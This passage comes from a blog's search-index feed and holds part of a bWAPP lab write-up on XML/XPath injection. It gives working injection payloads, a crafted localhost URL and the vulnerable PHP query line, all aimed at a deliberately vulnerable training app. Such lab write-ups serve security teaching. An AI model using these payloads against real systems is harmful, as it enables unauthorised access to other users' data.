XML as below. </p><p><code>blah' or id='2</code> this payload is getting the user detail of 2nd user. Accordingly, other user data also can be accessed.</p><p>another payload,</p><pre><code>blah' or 1=1 or '</code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p><h2 id="XML-XPath-Injection-search"><a href="#XML-XPath-Injection-search" class="headerlink" title="XML/XPath Injection (search):"></a>XML/XPath Injection (search):</h2><p>This injection is more of a blind XML/XPath.</p><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>payload is, </p><pre><code>')]/child::node() | blah[contains(blah,'</code></pre><p>Payload should be in genre field, then updated Url is</p><pre><code>localhost/bwapp/xmli_2.php?genre=%27)]/child::node()%20|%20blah[contains(blah,%27&amp;action=search</code></pre><p>Entity name is unknown. So, <code>child::node()</code> is to select all the node. That’s why it prints all the data.</p><p>The source code is,</p><pre><code>$result = $xml-&gt;xpath("//hero[contains(genre, '$genre')]/movie");</code></pre><h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/XPATH_Injectionhttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
